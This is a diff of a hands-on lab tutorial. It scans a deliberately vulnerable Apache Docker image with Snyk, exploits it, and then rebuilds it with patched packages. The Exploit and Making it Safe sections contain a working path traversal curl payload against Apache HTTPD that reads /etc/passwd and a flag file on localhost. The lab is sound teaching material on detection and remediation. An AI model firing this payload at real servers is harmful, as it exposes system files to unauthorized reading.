@@ -24,14 +24,10 @@ To use Snyk, you must first:
 
 You can now start to scan local images using Snyk. Snyk will analyise the dependencies installed in the image, and scan them against its backend database of vulnerabilities.
 
-
-### Updating the dependency 
-
-In the Dockerfile
+Snyk is already installed on the Playground instances, so we can skip this step.
 
 
-
-## Making it safe 
+## Building and Scanning Vulnerable IMage
 
 There are two directories within the Docker directory, both containing a Dockerfile and a set of dependencies.
 
@@ -41,7 +37,7 @@ There are two directories within the Docker directory, both containing a Dockerf
 To build the vulnerable image, run the following command:
 
 ```
-$ docker build vulnerable -t apache-vulnerable
+$ bash build.sh
 ```
 
 This will create a Docker image using the Dockerfile located in the `vulnerable` directory, and tag it `apache-vulnerable`.
@@ -52,7 +48,7 @@ Now you have built the vulnerable Docker image, it's time to scan this using Sny
 $ snyk container test apache-vulnerable
 
 
-Testing cve-2021...
+Testing apache-vulnerable...
 
 
 ✗ Low severity vulnerability found in apache2/apache2-bin
@@ -98,19 +94,20 @@ Testing cve-2021...
 
 Organization:      ecsdcmhrpr
 Package manager:   deb
-Project name:      docker-image|cve-2021
-Docker image:      cve-2021
+Project name:      docker-image|apache-vulnerable
+Docker image:      apache-vulnerable
 Platform:          linux/amd64
 Licenses:          enabled
 
 Tested 146 dependencies for known issues, found 55 issues.
 
 Pro tip: use `--file` option to get base image remediation advice.
-Example: $ snyk test --docker cve-2021 --file=path/to/Dockerfile
+Example: $ snyk test --docker apache-vulnerable --file=path/to/Dockerfile
 
 To remove this message in the future, please run `snyk config set disableSuggestions=true`
 
 ```
+
 
 ## Exploit
 
@@ -119,10 +116,10 @@ We've shown how to detect the vulnerable package, but lets now show you how to e
 First up, start up a new container from the created image
 
 ```bash
-$ docker run -d -p 9000:80  cve-2021
+$ docker run -d -p 9000:80  apache-vulnerable
 ```
 
-This will start a new container, using the cve-2021 image, mapping the port 9000 to the port run on the apache server within the container. The `-d` flag means it will run in the background.
+This will start a new container, using the apache-vulnerable image, mapping the port 9000 to the port run on the apache server within the container. The `-d` flag means it will run in the background.
 
 Lets test we can connect to the server:
 
@@ -160,8 +157,39 @@ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 
 This will exploit a flaw in the directory traversal code of the Apache HTTPD server. IN this case, we will use this exploit to read the contents of the "/etc/passwd" file.
 
-To actually retrieve the flag, we will change the command to print the contents of /workon/flag.txt:
+To actually retrieve the flag, we will change the command to print the contents of /etc/flag.txt:
 
 ```
-curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/workon/flag.txt"
+curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt"
+```
+
+
+## Making it Safe
+
+Now we've demonstrated the exploit and how to scan for the critical vulnerabilities used to run the exploit, lets go and make it safe.
+
+Included in the `docker` directory is a directory called `safe` which includes patched versions of the apache dependencies.
+
+Let's run the following command to build the safe image (apache-safe):
+
+```
+bash build_safe.sh
+```
+
+You can create a new container using this image (remember to stop the first one by running docker kill <ID>)
+
+```bash
+$ docker run -d -p 9000:80  apache-safe
+```
+
+Run the exploit:
+
+```
+curl -s --path-as-is "http://localhost:9000/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt"
+```
+
+And to scan the new image to confirm the vulnerability is no longer present:
+
+```
+$ snyk container test apache-safe
 ```
